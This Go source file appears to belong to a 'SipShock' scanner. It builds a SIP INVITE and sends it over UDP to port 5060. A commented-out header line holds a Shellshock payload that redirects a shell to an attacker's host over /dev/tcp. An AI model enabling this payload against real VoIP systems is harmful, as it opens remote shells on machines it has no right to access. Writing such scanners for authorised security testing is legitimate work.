package protocol

import (
	"fmt"
	"net"

	log "qiniupkg.com/x/log.v7"
)

// method sp uri sp version
// INVITE

// Create SIP INVITE package with extra header
func buildInv(raddress, rport string) string {
	return fmt.Sprint(
		"INVITE sip:0987654321@"+raddress+" SIP/2.0\r\n",
		"From: \"SipShock Scanner\" <sip:0123456789@"+raddress+">;tag=784218059\r\n",
		"To: <sip:0987654321@"+raddress+">\r\n",
		"Call-ID: 1864146746@192.168.1.12\r\n",
		"CSeq: 1 INVITE\r\n",
		"Contact: <sip:0123456789@192.168.1.12:5062>\r\n",
		"Content-Type: application/sdp\r\n",
		"Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n",
		"Max-Forwards: 70\r\n",
		"User-Agent: Yealink SIP-T26P\r\n",
		// The interesting stuff
		//"X-Ploit: () { :;};exec >/dev/tcp/"+laddress+"/"+lport+"\r\n",
		"Supported: replaces\r\n",
		"Expires: 360\r\n",
		"Allow-Events: talk,hold,conference,refer,check-sync\r\n",
		"Content-Length: 234\r\n\r\n",
		"v=0\r\n",
		"o=- 20800 20800 IN IP4 192.168.1.12\r\n",
		"s=SDP data\r\n",
		"c=IN IP4 192.168.1.12\r\n",
		"t=0 0\r\n",
		"m=audio 11796 RTP/AVP 18 101\r\n",
		"a=rtpmap:18 G729/8000\r\n",
		"a=fmtp:18 annexb=no\r\n",
		"a=fmtp:101 0-15\r\n",
		"a=rtpmap:101 telephone-event/8000\r\n",
		"a=ptime:20",
		"a=sendrecv\r\n\r\n",
	)
}

func SendSIP(addr string) {
	conn, err := net.Dial("udp", addr+":5060")

	if err != nil {
		log.Errorf(err.Error())
		return
	}
	conn.Write([]byte(buildInv(addr, "5060")))
	fmt.Println("already sent")
	buf := make([]byte, 1024)
	conn.Read(buf)
	fmt.Printf("%s\n", buf)
}
